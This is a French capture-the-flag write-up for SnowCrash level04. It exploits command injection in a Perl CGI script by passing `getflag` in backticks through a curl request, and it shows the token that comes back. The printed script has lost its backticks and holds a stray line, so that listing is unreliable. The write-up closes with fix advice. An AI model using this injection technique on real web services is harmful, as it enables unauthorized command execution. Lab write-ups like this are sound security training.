# SnowCrash - level04 writeup

## Objectif

Exploiter le script CGI level04.pl pour exécuter getflag via injection de commande, puis récupérer le token.

## Recon

Lecture du script :

```
cat level04.pl
#!/usr/bin/perl

localhost:4747

use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
$y = $_[0];
print echo $y 2>&1;
}
x(param("x"));
```

Point clé : le paramètre x est injecté dans une commande shell via backticks Perl :

```
print echo $y 2>&1;
```

## Analyse

Les backticks en Perl exécutent une commande via le shell.
Comme $y vient directement de l’input utilisateur, on peut injecter une substitution de commande (backticks) pour exécuter getflag.

## Exploitation

Requête HTTP vers le CGI en injectant getflag :

```
curl "localhost:4747/level04.pl?x=`getflag`"
```

Sortie obtenue :

```
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

## Résultat

- Vulnérabilité - > Command Injection via backticks Perl + input non filtré
- Token getflag - > ne2searoevaevoem4ov4ar8ap

## Notes

- Correction : ne jamais exécuter des commandes shell avec des paramètres non validés (utiliser system en liste, échapper, ou supprimer le shell)
- Ici echo $y devrait être remplacé par un affichage direct (sans shell)
